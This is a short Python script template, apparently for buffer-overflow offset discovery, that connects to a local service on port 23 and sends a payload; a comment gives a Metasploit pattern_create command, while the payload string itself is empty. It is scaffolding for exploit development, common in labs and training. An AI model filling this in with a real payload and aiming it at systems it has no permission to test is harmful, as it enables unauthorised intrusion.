import socket,sys

#msf-pattern_create -l 2000 -s ABCDEFGHIKL,alienum,123456789
payload = ""

try: 
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',23))
    s.recv(1024)
    s.send(payload)
    s.close()
except:
    print("[X] Connection error")
    sys.exit()
